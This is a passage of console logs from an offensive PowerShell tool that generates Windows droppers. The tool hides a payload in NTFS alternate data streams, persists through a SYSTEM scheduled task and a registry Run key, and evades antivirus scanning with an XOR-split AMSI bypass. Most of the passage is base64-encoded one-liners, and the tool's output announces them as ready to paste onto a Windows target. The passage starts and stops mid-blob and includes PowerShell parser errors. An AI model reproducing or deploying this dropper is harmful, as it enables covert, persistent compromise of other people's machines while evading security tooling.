AoAJABfAHQAcgBpAGcAZwBlAHIAcwArAD0AJABfAHQAUAAKACQAXwBzAHQAZwA9AE4AZQB3AC0AUwBjAGgAZQBkAHUAbABlAGQAVABhAHMAawBTAGUAdAB0AGkAbgBnAHMAUwBlAHQAIAAtAEEAbABsAG8AdwBTAHQAYQByAHQASQBmAE8AbgBCAGEAdAB0AGUAcgBpAGUAcwAgAC0ARABvAG4AdABTAHQAbwBwAEkAZgBHAG8AaQBuAGcATwBuAEIAYQB0AHQAZQByAGkAZQBzACAALQBIAGkAZABkAGUAbgAKAAoAJABwAD0ATgBlAHcALQBTAGMAaABlAGQAdQBsAGUAZABUAGEAcwBrAFAAcgBpAG4AYwBpAHAAYQBsACAALQBVAHMAZQByAEkAZAAgACIAUwBZAFMAVABFAE0AIgAgAC0ATABvAGcAbwBuAFQAeQBwAGUAIABTAGUAcgB2AGkAYwBlAEEAYwBjAG8AdQBuAHQAIAAtAFIAdQBuAEwAZQB2AGUAbAAgAEgAaQBnAGgAZQBzAHQACgAkAF8AYwB0AG4APQAkAHQAbgArACcALQBNAG8AbgBpAHQAbwByACcACgBSAGUAZwBpAHMAdABlAHIALQBTAGMAaABlAGQAdQBsAGUAZABUAGEAcwBrACAALQBUAGEAcwBrAE4AYQBtAGUAIAAkAF8AYwB0AG4AIAAtAEEAYwB0AGkAbwBuACAAJABhACAALQBUAHIAaQBnAGcAZQByACAAJABfAHQAcgBpAGcAZwBlAHIAcwAgAC0AUwBlAHQAdABpAG4AZwBzACAAJABfAHMAdABnACAALQBQAHIAaQBuAGMAaQBwAGEAbAAgACQAcAAgAC0ARgBvAHIAYwBlACAALQBFAEEAIABTAGkAbABlAG4AdABsAHkAQwBvAG4AdABpAG4AdQBlAHwATwB1AHQALQBOAHUAbABsAAoAIwAgAEUAeABlAGMAdQB0AGUAIABwAGEAeQBsAG8AYQBkACAAaQBtAG0AZQBkAGkAYQB0AGUAbAB5AAoASQBFAFgAIAAkAHAAbAAKAFcAcgBpAHQAZQAtAEgAbwBzAHQAIAAiAFsAKwBdACAARABlAHAAbABvAHkAbQBlAG4AdAAgAGMAbwBtAHAAbABlAHQAZQAgACgAQQBEAFMAOgAgACQAaABwAGAAOgAkAHMAbgApACIAIAAtAEYAbwByAGUAZwByAG8AdQBuAGQAQwBvAGwAbwByACAARwByAGUAZQBuAA==
At line:54 char:76
+ ... ll.exe -NoP -W Hidden -EP Bypass -C "'+$_regByp+'IEX(gc '$hp:$sn' -Ra ...
+                                                              ~~~~
Variable reference is not valid. ':' was not followed by a valid variable name character. Consider using ${} to delimit the name.
At line:54 char:76
+ ... xe -NoP -W Hidden -EP Bypass -C "'+$_regByp+'IEX(gc '$hp:$sn' -Raw)"'
+                                                          ~~~~~~~~~~~~~~~~
Unexpected token '$hp:$sn' -Raw)"'' in expression or statement.
At line:54 char:80
+ ... xe -NoP -W Hidden -EP Bypass -C "'+$_regByp+'IEX(gc '$hp:$sn' -Raw)"'
+                                                              ~~~~~~~~~~~~
Unexpected token '$sn' -Raw)"'' in expression or statement.
At line:54 char:83
+ ... xe -NoP -W Hidden -EP Bypass -C "'+$_regByp+'IEX(gc '$hp:$sn' -Raw)"'
+                                                                 ~~~~~~~~~
Unexpected token '' -Raw)"'' in expression or statement.
    + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException
    + FullyQualifiedErrorId : InvalidVariableReferenceWithDrive






LINUX CONTENT:
┌──(kali㉿kali)-[~/Desktop/apparition/Apparition-Delivery-System]
└─$ pwsh -NoProfile -Command "
  ./src/ADS-OneLiner.ps1 \
    -Payload 'New-Item \"\$env:TEMP\ads-t5-\$(Get-Random).txt\" -ItemType File -Force | Out-Null' \
    -Persist registry \
    -Obfuscate Advanced \
    -UseCompression \$false \
    -OutputFile /tmp/ads-t5-zw-reg.txt
" 2>&1
echo "EXIT=$? SIZE=$(wc -c < /tmp/ads-t5-zw-reg.txt 2>/dev/null || echo 0)b"

╔═══════════════════════════════════════════════════════════╗
║ ADS Minimal Command Generator v2.3                  ║
╚═══════════════════════════════════════════════════════════╝

[*] Using ADS-Dropper: /home/kali/Desktop/apparition/Apparition-Delivery-System/src/ADS-Dropper.ps1
[*] Generating configuration...
[+] Configuration computed
    Host: C:\ProgramData\UTicLgoV
    Stream: [char]0x0062+[char]0x0068+[char]0x006E+[char]0x0057+[char]0x0075+[char]0x0054+[char]0x006A+[char]0x0058
    Task: LanguageComponentsInstaller
    Trigger: AtLogOn+AtStartup
    Periodic: every 5m / Jitter: 20%
    AMSI Bypass: Enabled - XOR Fragment Splitting (Layer A + Layer B)
[*] Building minimal deployment commands...
[*] Layer A bypass generated (XOR key: random, 1194 chars)
[*] Adding runtime deep placement logic...
[*] Encoding for transport...
[*] Saving manifest...
[+] Manifest saved to: ./manifests/manifest-20260220-015309.json
[*] Generating output formats...

╔═══════════════════════════════════════════════════════════╗
║ SUMMARY                                                   ║
╚═══════════════════════════════════════════════════════════╝

✓ Minimal commands generated
✓ Output saved to: /tmp/ads-t5-zw-reg.txt
✓ Manifest saved for recovery
✓ AMSI bypass: XOR Fragment Splitting (Layer A + Layer B)
  - Layer A: deployment script (random XOR key per generation)
  - Layer B: scheduled task execution (separate random key)
  - Source text: only byte arrays + generic decode loop
  - No .GetType/.GetField/.SetValue chain in source

READY TO DEPLOY!
Copy-paste to Windows target and execute.

EXIT=0 SIZE=33797b
                                                                                                                     
┌──(kali㉿kali)-[~/Desktop/apparition/Apparition-Delivery-System]
└─$ cat /tmp/ads-t5-zw-reg.txt  
╔═══════════════════════════════════════════════════════════╗
║ ADS Minimal Deployment Commands                          ║
║ Generated: 2026-02-20 01:53:09                         ║
╚═══════════════════════════════════════════════════════════╝

CONFIGURATION:
  Host File: C:\ProgramData\UTicLgoV
  Stream Name: bhnWuTjX
  Task Name: LanguageComponentsInstaller
  Zero-Width Mode: single
  Persistence: registry
  Trigger: AtLogOn+AtStartup + Periodic(5m) + Jitter(20%)
  Decoys: 0
  Encryption: False
  Randomized: True
  Deep Placement: True
  Attach to Existing: True
  Instances: 1
  Compression: False
  AMSI Bypass: True (XOR Fragment Splitting - Layer A + Layer B)
  Payload Source: Command-line

PAYLOAD SIZE:
  Readable: 8132 characters
  Encoded: 21688 characters

╔═══════════════════════════════════════════════════════════╗
║ OPTION 1: Base64 Encoded One-Liner (Recommended)         ║
╚═══════════════════════════════════════════════════════════╝

powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand IwAgAEMAbwBuAGYAaQBnAHUAcgBhAHQAaQBvAG4AIAAoAGYAYQBsAGwAYgBhAGMAawAgAHYAYQBsAHUAZQBzACkACgAkAF8AaABwADAAPQAnAEMAOgBcAFAAcgBvAGcAcgBhAG0ARABhAHQAYQBcAFUAVABpAGMATABnAG8AVgAnAAoAJABfAHMAbgAwAD0AWwBjAGgAYQByAF0AMAB4ADAAMAA2ADIAKwBbAGMAaABhAHIAXQAwAHgAMAAwADYAOAArAFsAYwBoAGEAcgBdADAAeAAwADAANgBFACsAWwBjAGgAYQByAF0AMAB4ADAAMAA1ADcAKwBbAGMAaABhAHIAXQAwAHgAMAAwADcANQArAFsAYwBoAGEAcgBdADAAeAAwADAANQA0ACsAWwBjAGgAYQByAF0AMAB4ADAAMAA2AEEAKwBbAGMAaABhAHIAXQAwAHgAMAAwADUAOAAKACQAXwB0AG4AMAA9ACcATABhAG4AZwB1AGEAZwBlAEMAbwBtAHAAbwBuAGUAbgB0AHMASQBuAHMAdABhAGwAbABlAHIAJwAKACMAIABSAHUAbgB0AGkAbQBlACAAZQB2AGEAcwBpAG8AbgAKACQAXwB4AGsAPQAwAHgAMwBEADsAZgB1AG4AYwB0AGkAbwBuACAAXwB4AGQAKABbAGIAeQB0AGUAWwBdAF0AJABkACwAWwBiAHkAdABlAF0AJABrACkAewAtAGoAbwBpAG4AKAAkAGQAfAAlAHsAWwBjAGgAYQByAF0AKAAkAF8AIAAtAGIAeABvAHIAIAAkAGsAKQB9ACkAfQA7AHQAcgB5AHsAQAAoACwAQAAoADIANQAsADcAOAAsADkANAAsADcAOQAsADgANAAsADcANwAsADcAMwAsADcALAA5ADgALAA3ADkALAA5ADIALAAwACwAMQAwADIALAAxADEAMQAsADgAOAAsADkAMQAsADkANgAsADEAOQAsADEAMgA0ACwANwA4ACwANwA4ACwAOAA4ACwAOAAwACwAOQA1ACwAOAAxACwANgA4ACwANgAsADIANQAsADcAOAAsADkANAAsADcAOQAsADgANAAsADcANwAsADcAMwAsADcALAA5ADgALAA4ADAALAAxADIALAAwACwAMwAxACwAMQAyADIALAA4ADgALAAzADEALAAyADIALAAzADEALAA3ADMALAAxADAANQAsADYAOAAsADMAMQAsADIAMgAsADMAMQAsADcANwAsADgAOAAsADMAMQApACwAQAAoADIANQAsADcAOAAsADkANAAsADcAOQAsADgANAAsADcANwAsADcAMwAsADcALAA5ADgALAA3ADMALAA3ADcALAAwACwAMgA1ACwANwA4ACwAOQA0ACwANwA5ACwAOAA0ACwANwA3ACwANwAzACwANwAsADkAOAAsADcAOQAsADkAMgAsADEAOQAsADMAMQAsADIANQAsADIAMQAsADIANQAsADcAOAAsADkANAAsADcAOQAsADgANAAsADcANwAsADcAMwAsADcALAA5ADgALAA4ADAALAAxADIALAAyADAALAAzADEALAAyADEALAAyADEALAAzADEALAAxADEAMAAsADYAOAAsADcAOAAsADMAMQAsADIAMgAsADMAMQAsADcAMwAsADgAOAAsADgAMAAsADEAOQAsADEAMQAyACwAOQAyACwAOAAzACwAOQAyACwAMwAxACwAMgAyACwAMwAxACwAOQAwACwAOAA4ACwAOAAwACwAOAA4ACwAOAAzACwANwAzACwAMQA5ACwAMQAyADQALAA3ADIALAA3ADMALAA4ADIALAAzADEALAAyADIALAAzADEALAA4ADAALAA5ADIALAA3ADMALAA4ADQALAA4ADIALAA4ADMALAAxADkALAAzADEALAAyADIALAAzADEALAAxADIANAAsADgAMAAsADMAMQAsADIAMgAsADMAMQAsADcAOAAsADgANAAsADMAMQAsADIAMgAsADMAMQAsADEAMAA0ACwANwAzACwAOAA0ACwAMwAxACwAMgAyACwAMwAxACwAOAAxACwANwA4ACwAMwAxACwAMgAwACwAMgAwACkALABAACgAMgA1ACwANwA4ACwAOQA0ACwANwA5ACwAOAA0ACwANwA3ACwANwAzACwANwAsADkAOAAsADgAMAAsADEANQAsADAALAAzADEALAAxADIAMgAsADgAOAAsADcAMwAsADMAMQAsADIAMgAsADMAMQAsADEAMgAzACwAOAA0ACwAOAA4ACwAMwAxACwAMgAyACwAMwAxACwAOAAxACwAOAA5ACwAMwAxACwANgAsADIANQAsADcAOAAsADkANAAsADcAOQAsADgANAAsADcANwAsADcAMwAsADcALAA5ADgALAA5ADEALAA4ADkALAAwACwAMgA1ACwANwA4ACwAOQA0ACwANwA5ACwAOAA0ACwANwA3ACwANwAzACwANwAsADkAOAAsADcAMwAsADcANwAsADEAOQAsADMAMQAsADIANQAsADIAMQAsADIANQAsADcAOAAsADkANAAsADcAOQAsADgANAAsADcANwAsADcAMwAsADcALAA5ADgALAA4ADAALAAxADUALAAyADAALAAzADEALAAyADEALAAyADEALAAzADEALAA5ADIALAA4ADAALAAzADEALAAyADIALAAzADEALAA3ADgALAA4ADQALAAxADEANgAsADgAMwAsADMAMQAsADIAMgAsADMAMQAsADgANAAsADcAMwAsADEAMgAzACwAOQAyACwAMwAxACwAMgAyACwAMwAxACwAOAA0ACwAOAAxACwAOAA4ACwAOAA5ACwAMwAxACwAMgAwACwAMQA3ACwAMgAxACwAMwAxACwAMQAxADUALAA4ADIALAA4ADMALAAzADEALAAyADIALAAzADEALAAxADAAOQAsADcAMgAsADkANQAsADgAMQAsADMAMQAsADIAMgAsADMAMQAsADgANAAsADkANAAsADEANwAsADEAMQAwACwANwAzACwAOQAyACwAMwAxACwAMgAyACwAMwAxACwANwAzACwAOAA0ACwAOQA0ACwAMwAxACwAMgAwACwAMgAwACkALABAACgAMgA1ACwANwA4ACwAOQA0ACwANwA5ACwAOAA0ACwANwA3ACwANwAzACwANwAsADkAOAAsADgAMAAsADEANAAsADAALAAzADEALAAxADEAMAAsADgAOAAsADcAMwAsADMAMQAsADIAMgAsADMAMQAsADEAMAA3ACwAOQAyACwAOAAxACwAMwAxACwAMgAyACwAMwAxACwANwAyACwAOAA4ACwAMwAxACwANgAsADIANQAsADcAOAAsADkANAAsADcAOQAsADgANAAsADcANwAsADcAMwAsADcALAA5ADgALAA5ADEALAA4ADkALAAxADkALAAzADEALAAyADUALAAyADEALAAyADUALAA3ADgALAA5ADQALAA3ADkALAA4ADQALAA3ADcALAA3ADMALAA3ACwAOQA4ACwAOAAwACwAMQA0ACwAMgAwACwAMwAxACwAMgAxACwAMgA1ACwAOAAzACwANwAyACwAOAAxACwAOAAxACwAMQA3ACwAMgA1ACwANwAzACwANwA5ACwANwAyACwAOAA4ACwAMgAwACkAKQB8ACUAewBJAEUAWAAoAF8AeABkACAAJABfACAAJABfAHgAawApAH0AfQBjAGEAdABjAGgAewB9AAoAIwAgAFAAYQB5AGwAbwBhAGQACgAkAHAAbAA9ACcATgBlAHcALQBJAHQAZQBtACAAIgAkAGUAbgB2ADoAVABFAE0AUABcAGEAZABzAC0AdAA1AC0AJAAoAEcAZQB0AC0AUgBhAG4AZABvAG0AKQAuAHQAeAB0ACIAIAAtAEkAdABlAG0AVAB5AHAAZQAgAEYAaQBsAGUAIAAtAEYAbwByAGMAZQAgAHwAIABPAHUAdAAtAE4AdQBsAGwAJwAKAAoAJABoAHAAPQAkAF8AaABwADAAOwAkAHMAbgA9ACQAXwBzAG4AMAA7ACQAdABuAD0AJABfAHQAbgAwAAoACgAjACAAUgB1AG4AdABpAG0AZQAgAGQAZQBlAHAAIABwAGwAYQBjAGUAbQBlAG4AdAAKACQAXwBkAGUAZQBwAEQAaQByAHMAIAA9ACAAQAAoAAoAIAAgACAAIAAiACQAZQBuAHYAOgBQAHIAbwBnAHIAYQBtAEQAYQB0AGEAXABNAGkAYwByAG8AcwBvAGYAdABcAFcAaQBuAGQAbwB3AHMAXABXAEUAUgBcAFIAZQBwAG8AcgB0AFEAdQBlAHUAZQAiACwACgAgACAAIAAgACIAJABlAG4AdgA6AFAAcgBvAGcAcgBhAG0ARABhAHQAYQBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwBcAFcARQBSAFwAVABlAG0AcAAiACwACgAgACAAIAAgACIAJABlAG4AdgA6AEwATwBDAEEATABBAFAAUABEAEEAVABBAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAQwBhAGMAaABlAHMAIgAsAAoAIAAgACAAIAAiACQAZQBuAHYAOgBMAE8AQwBBAEwAQQBQAFAARABBAFQAQQBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwBcAFcAZQBiAEMAYQBjAGgAZQAiACwACgAgACAAIAAgACIAJABlAG4AdgA6AFcASQBOAEQASQBSAFwAVABlAG0AcAAiACwACgAgACAAIAAgACIAJABlAG4AdgA6AFAAcgBvAGcAcgBhAG0ARABhAHQAYQBcAE0AaQBjAHIAbwBzAG8AZgB0AFwARABpAGEAZwBuAG8AcwBpAHMAIgAsAAoAIAAgACAAIAAiACQAZQBuAHYAOgBQAHIAbwBnAHIAYQBtAEQAYQB0AGEAXABNAGkAYwByAG8AcwBvAGYAdABcAFcAaQBuAGQAbwB3AHMAXABQAG8AdwBlAHIAIABFAGYAZgBpAGMAaQBlAG4AYwB5ACAARABpAGEAZwBuAG8AcwB0AGkAYwBzACIACgApAAoAJABfAHYAYQBsAGkAZABEAGkAcgBzACAAPQAgACQAXwBkAGUAZQBwAEQAaQByAHMAIAB8ACAAVwBoAGUAcgBlAC0ATwBiAGoAZQBjAHQAIAB7ACAAVABlAHMAdAAtAFAAYQB0AGgAIAAkAF8AIAB9AAoAJABfAGQAZQBuAHkATgBhAG0AZQBzACAAPQAgAEAAKAAnAHEAbQBnAHIALgBkAGIAJwAsACcAcQBtAGcAcgAuAGQAYQB0ACcALAAnAHMAcgB1AGQAYgAuAGQAYQB0ACcALAAnAFcAZQBiAEMAYQBjAGgAZQBWADAAMQAuAGQAYQB0ACcALAAnAEQAYQB0AGEAUwB0AG8AcgBlAC4AZQBkAGIAJwAsACcAcAByAGkAdgAxAC4AZQBkAGIAJwAsACcAVwBpAG4AZABvAHcAcwAuAGUAZABiACcAKQAKACQAXwBkAGUAbgB5AEUAeAB0AHMAIAA9ACAAQAAoACcALgBlAGQAYgAnACwAJwAuAGUAdABsACcAKQAKACQAXwBmAG8AdQBuAGQAIAA9ACAAJABmAGEAbABzAGUACgBmAG8AcgBlAGEAYwBoACAAKAAkAF8AZABpAHIAIABpAG4AIAAoACQAXwB2AGEAbABpAGQARABpAHIAcwAgAHwAIABHAGUAdAAtAFIAYQBuAGQAbwBtACAALQBDAG8AdQBuAHQAIAAoAFsATQBhAHQAaABdADoAOgBNAGkAbgAoADMALAAgACQAXwB2AGEAbABpAGQARABpAHIAcwAuAEMAbwB1AG4AdAApACkAKQApACAAewAKACAAIAAgACAAJABfAGMAYQBuAGQAaQBkAGEAdABlACAAPQAgAEcAZQB0AC0AQwBoAGkAbABkAEkAdABlAG0AIAAtAFAAYQB0AGgAIAAkAF8AZABpAHIAIAAtAEYAaQBsAGUAIAAtAEUAQQAgADAAIAB8AAoAIAAgACAAIAAgACAAIAAgAFcAaABlAHIAZQAtAE8AYgBqAGUAYwB0ACAAewAgACQAXwAuAEwAZQBuAGcAdABoACAALQBnAHQAIAAwACAALQBhAG4AZAAgACQAXwAuAEwAZQBuAGcAdABoACAALQBsAHQAIAA1AE0AQgAgAC0AYQBuAGQAIAAkAF8ALgBOAGEAbQBlACAALQBuAG8AdABpAG4AIAAkAF8AZABlAG4AeQBOAGEAbQBlAHMAIAAtAGEAbgBkACAAJABfAC4ARQB4AHQAZQBuAHMAaQBvAG4AIAAtAG4AbwB0AGkAbgAgACQAXwBkAGUAbgB5AEUAeAB0AHMAIAB9ACAAfAAKACAAIAAgACAAIAAgACAAIABTAGUAbABlAGMAdAAtAE8AYgBqAGUAYwB0ACAALQBGAGkAcgBzAHQAIAAxADAAIAB8ACAARwBlAHQALQBSAGEAbgBkAG8AbQAKACAAIAAgACAAaQBmACAAKAAkAF8AYwBhAG4AZABpAGQAYQB0AGUAKQAgAHsACgAgACAAIAAgACAAIAAgACAAJABoAHAAIAA9ACAAJABfAGMAYQBuAGQAaQBkAGEAdABlAC4ARgB1AGwAbABOAGEAbQBlAAoAIAAgACAAIAAgACAAIAAgACQAXwBmAG8AdQBuAGQAIAA9ACAAJAB0AHIAdQBlAAoAIAAgACAAIAAgACAAIAAgAGIAcgBlAGEAawAKACAAIAAgACAAfQAKAH0ACgBpAGYAIAAoAC0AbgBvAHQAIAAkAF8AZgBvAHUAbgBkACAALQBhAG4AZAAgACQAXwB2AGEAbABpAGQARABpAHIAcwApACAAewAKACQAXwBuAGEAbQBlAHMAIAA9ACAAQAAoACcAUgBlAHAAbwByAHQALgB3AGUAcgAnACwAJwBlAHQAbABfAGQAYQB0AGEALgBsAG8AZwAnACwAJwBXAFAAUgBfAGkAbgBpAHQAaQBhAHQAZQBkAC4AZABhAHQAJwAsACcAZABpAGEAZwBfAHIAZQBwAG8AcgB0AC4AeABtAGwAJwAsACcAYwBhAGMAaABlAF8AZQBuAHQAcgB5AC4AZABhAHQAJwAsACcAYQByAGkAYQAtAGQAZQBiAHUAZwAuAGwAbwBnACcAKQAKACQAaABwACAAPQAgAEoAbwBpAG4ALQBQAGEAdABoACAAKAAkAF8AdgBhAGwAaQBkAEQAaQByAHMAIAB8ACAARwBlAHQALQBSAGEAbgBkAG8AbQApACAAKAAkAF8AbgBhAG0AZQBzACAAfAAgAEcAZQB0AC0AUgBhAG4AZABvAG0AKQAKAH0ACgAKACMAIABDAHIAZQBhAHQAZQAgAEEARABTACAAKABlAG4AcwB1AHIAZQAgAHAAYQByAGUAbgB0ACAAZABpAHIAIABlAHgAaQBzAHQAcwApAAoAJABfAHAAZAA9AFMAcABsAGkAdAAtAFAAYQB0AGgAIAAkAGgAcAAgAC0AUABhAHIAZQBuAHQAOwBpAGYAKAAkAF8AcABkACAALQBhAG4AZAAgACEAKABUAGUAcwB0AC0AUABhAHQAaAAgACQAXwBwAGQAKQApAHsAbgBpACAAJABfAHAAZAAgAC0ASQB0AGUAbQBUAHkAcABlACAARABpAHIAZQBjAHQAbwByAHkAIAAtAEYAbwByAGMAZQB8AE8AdQB0AC0ATgB1AGwAbAB9AAoAaQBmACgAIQAoAFQAZQBzAHQALQBQAGEAdABoACAAJABoAHAAKQApAHsAbgBpACAAJABoAHAAIAAtAEkAdABlAG0AVAB5AHAAZQAgAEYAaQBsAGUAIAAtAEYAbwByAGMAZQB8AE8AdQB0AC0ATgB1AGwAbAB9AAoAJABwAGwAfABzAGMAIAAiACQAaABwAGAAOgAkAHMAbgAiACAALQBGAG8AcgBjAGUAIAAtAEUAQQAgAFMAaQBsAGUAbgB0AGwAeQBDAG8AbgB0AGkAbgB1AGUACgAjACAAUABvAHMAdAAtAHcAcgBpAHQAZQAgAHYAZQByAGkAZgBpAGMAYQB0AGkAbwBuACAAFCAgAG4AZQB2AGUAcgAgAHQAcgB1AHMAdAAgAHMAaQBsAGUAbgB0ACAAZgBhAGkAbAB1AHIAZQBzAAoAaQBmACgALQBuAG8AdAAoAEcAZQB0AC0ASQB0AGUAbQAgACQAaABwACAALQBTAHQAcgBlAGEAbQAgACQAcwBuACAALQBFAEEAIAAwACkAKQB7AAoAIAAgACAAIABXAHIAaQB0AGUALQBXAGEAcgBuAGkAbgBnACAAIgBBAEQAUwAgAHcAcgBpAHQAZQAgAGYAYQBpAGwAZQBkACAAbwBuACAAJABoAHAAIAAtACAAdQBzAGkAbgBnACAAZgBhAGwAbABiAGEAYwBrACIACgAgACAAIAAgACQAaABwAD0ASgBvAGkAbgAtAFAAYQB0AGgAIAAkAGUAbgB2ADoAUAByAG8AZwByAGEAbQBEAGEAdABhACAAKAAiAGMAYQBjAGgAZQBfACIAKwBbAGcAdQBpAGQAXQA6ADoATgBlAHcARwB1AGkAZAAoACkALgBUAG8AUwB0AHIAaQBuAGcAKAApAC4AUwB1AGIAcwB0AHIAaQBuAGcAKAAwACwAOAApACsAIgAuAGQAYQB0ACIAKQAKACAAIAAgACAAaQBmACgAIQAoAFQAZQBzAHQALQBQAGEAdABoACAAJABoAHAAKQApAHsAbgBpACAAJABoAHAAIAAtAEkAdABlAG0AVAB5AHAAZQAgAEYAaQBsAGUAIAAtAEYAbwByAGMAZQB8AE8AdQB0AC0ATgB1AGwAbAB9AAoAIAAgACAAIAAkAHAAbAB8AHMAYwAgACIAJABoAHAAYAA6ACQAcwBuACIAIAAtAEYAbwByAGMAZQAKACAAIAAgACAAaQBmACgALQBuAG8AdAAoAEcAZQB0AC0ASQB0AGUAbQAgACQAaABwACAALQBTAHQAcgBlAGEAbQAgACQAcwBuACAALQBFAEEAIAAwACkAKQB7AFcAcgBpAHQAZQAtAEUAcgByAG8AcgAgACIAQQBEAFMAIAB3AHIAaQB0AGUAIABmAGEAaQBsAGUAZAAgAG8AbgAgAGYAYQBsAGwAYgBhAGMAawAiADsAZQB4AGkAdAAgADEAfQAKAH0ACgAkAF8AcgBlAGcAQgB5AHAAPQAnACQAXwB4AGsAPQAwAHgANgA3ADsAZgB1AG4AYwB0AGkAbwBuACAAXwB4AGQAKABbAGIAeQB0AGUAWwBdAF0AJABkACwAWwBiAHkAdABlAF0AJABrACkAewAtAGoAbwBpAG4AKAAkAGQAfAAlAHsAWwBjAGgAYQByAF0AKAAkAF8AIAAtAGIAeABvAHIAIAAkAGsAKQB9ACkAfQA7AHQAcgB5AHsAQAAoACwAQAAoADYANwAsADIAMAAsADQALAAyADEALAAxADQALAAyADMALAAxADkALAA5ADMALAA1ADYALAAyADEALAA2ACwAOQAwACwANgAwACwANQAzACwAMgAsADEALAA1ADgALAA3ADMALAAzADgALAAyADAALAAyADAALAAyACwAMQAwACwANQAsADEAMQAsADMAMAAsADkAMgAsADYANwAsADIAMAAsADQALAAyADEALAAxADQALAAyADMALAAxADkALAA5ADMALAA1ADYALAAxADAALAA4ADYALAA5ADAALAA2ADkALAAzADIALAAyACwANgA5ACwANwA2ACwANgA5ACwAMQA5ACwANQAxACwAMwAwACwANgA5ACwANwA2ACwANgA5ACwAMgAzACwAMgAsADYAOQApACwAQAAoADYANwAsADIAMAAsADQALAAyADEALAAxADQALAAyADMALAAxADkALAA5ADMALAA1ADYALAAxADkALAAyADMALAA5ADAALAA2ADcALAAyADAALAA0ACwAMgAxACwAMQA0ACwAMgAzACwAMQA5ACwAOQAzACwANQA2ACwAMgAxACwANgAsADcAMwAsADYAOQAsADYANwAsADcAOQAsADYANwAsADIAMAAsADQALAAyADEALAAxADQALAAyADMALAAxADkALAA5ADMALAA1ADYALAAxADAALAA4ADYALAA3ADgALAA2ADkALAA3ADkALAA3ADkALAA2ADkALAA1ADIALAAzADAALAAyADAALAA2ADkALAA3ADYALAA2ADkALAAxADkALAAyACwAMQAwACwANwAzACwANAAyACwANgAsADkALAA2ACwANgA5ACwANwA2ACwANgA5ACwAMAAsADIALAAxADAALAAyACwAOQAsADEAOQAsADcAMwAsADMAOAAsADEAOAAsADEAOQAsADgALAA2ADkALAA3ADYALAA2ADkALAAxADAALAA2ACwAMQA5ACwAMQA0ACwAOAAsADkALAA3ADMALAA2ADkALAA3ADYALAA2ADkALAAzADgALAAxADAALAA2ADkALAA3ADYALAA2ADkALAAyADAALAAxADQALAA2ADkALAA3ADYALAA2ADkALAA1ADAALAAxADkALAAxADQALAA2ADkALAA3ADYALAA2ADkALAAxADEALAAyADAALAA2ADkALAA3ADgALAA3ADgAKQAsAEAAKAA2ADcALAAyADAALAA0ACwAMgAxACwAMQA0ACwAMgAzACwAMQA5ACwAOQAzACwANQA2ACwAMQAwACwAOAA1ACwAOQAwACwANgA5ACwAMwAyACwAMgAsADEAOQAsADYAOQAsADcANgAsADYAOQAsADMAMwAsADEANAAsADIALAA2ADkALAA3ADYALAA2ADkALAAxADEALAAzACwANgA5ACwAOQAyACwANgA3ACwAMgAwACwANAAsADIAMQAsADEANAAsADIAMwAsADEAOQAsADkAMwAsADUANgAsADEALAAzACwAOQAwACwANgA3ACwAMgAwACwANAAsADIAMQAsADEANAAsADIAMwAsADEAOQAsADkAMwAsADUANgAsADEAOQAsADIAMwAsADcAMwAsADYAOQAsADYANwAsADcAOQAsADYANwAsADIAMAAsADQALAAyADEALAAxADQALAAyADMALAAxADkALAA5ADMALAA1ADYALAAxADAALAA4ADUALAA3ADgALAA2ADkALAA3ADkALAA3ADkALAA2ADkALAA2ACwAMQAwACwANgA5ACwANwA2ACwANgA5ACwAMgAwACwAMQA0ACwANAA2ACwAOQAsADYAOQAsADcANgAsADYAOQAsADEANAAsADEAOQAsADMAMwAsADYALAA2ADkALAA3ADYALAA2ADkALAAxADQALAAxADEALAAyACwAMwAsADYAOQAsADcAOAAsADcANQAsADcAOQAsADYAOQAsADQAMQAsADgALAA5ACwANgA5ACwANwA2ACwANgA5ACwANQA1ACwAMQA4ACwANQAsADEAMQAsADYAOQAsADcANgAsADYAOQAsADEANAAsADQALAA3ADUALAA1ADIALAAxADkALAA2ACwANgA5ACwANwA2ACwANgA5ACwAMQA5ACwAMQA0ACwANAAsADYAOQAsADcAOAAsADcAOAApACwAQAAoADYANwAsADIAMAAsADQALAAyADEALAAxADQALAAyADMALAAxADkALAA5ADMALAA1ADYALAAxADAALAA4ADQALAA5ADAALAA2ADkALAA1ADIALAAyACwAMQA5ACwANgA5ACwANwA2ACwANgA5ACwANAA5ACwANgAsADEAMQAsADYAOQAsADcANgAsADYAOQAsADEAOAAsADIALAA2ADkALAA5ADIALAA2ADcALAAyADAALAA0ACwAMgAxACwAMQA0ACwAMgAzACwAMQA5ACwAOQAzACwANQA2ACwAMQAsADMALAA3ADMALAA2ADkALAA2ADcALAA3ADkALAA2ADcALAAyADAALAA0ACwAMgAxACwAMQA0ACwAMgAzACwAMQA5ACwAOQAzACwANQA2ACwAMQAwACwAOAA0ACwANwA4ACwANgA5ACwANwA5ACwANgA3ACwAOQAsADEAOAAsADEAMQAsADEAMQAsADcANQAsADYANwAsADEAOQAsADIAMQAsADEAOAAsADIALAA3ADgAKQApAHwAJQB7AEkARQBYACgAXwB4AGQAIAAkAF8AIAAkAF8AeABrACkAfQB9AGMAYQB0AGMAaAB7AH0AOwAnAAoAJABfAHIAZQBnAEMAbQBkAD0AJwBwAG8AdwBlAHIAcwBoAGUAbABsAC4AZQB4AGUAIAAtAE4AbwBQACAALQBXACAASABpAGQAZABlAG4AIAAtAEUAUAAgAEIAeQBwAGEAcwBzACAALQBDACAAIgAnACsAJABfAHIAZQBnAEIAeQBwACsAJwBJAEUAWAAoAGcAYwAgACcAJABoAHAAOgAkAHMAbgAnACAALQBSAGEAdwApACIAJwAKAFMAZQB0AC0ASQB0AGUAbQBQAHIAbwBwAGUAcgB0AHkAIAAtAFAAYQB0AGgAIAAnAEgASwBDAFUAOgBcAFMAbwBmAHQAdwBhAHIAZQBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwBcAEMAdQByAHIAZQBuAHQAVgBlAHIAcwBpAG8AbgBcAFIAdQBuACcAIAAtAE4AYQBtAGUAIAAkAHQAbgAgAC0AVgBhAGwAdQBlACAAJABfAHIAZQBnAEMAbQBkAAoAJABfAGkAcwBBAGQAbQBpAG4APQAoAFsAUwBlAGMAdQByAGkAdAB5AC4AUAByAGkAbgBjAGkAcABhAGwALgBXAGkAbgBkAG8AdwBzAFAAcgBpAG4AYwBpAH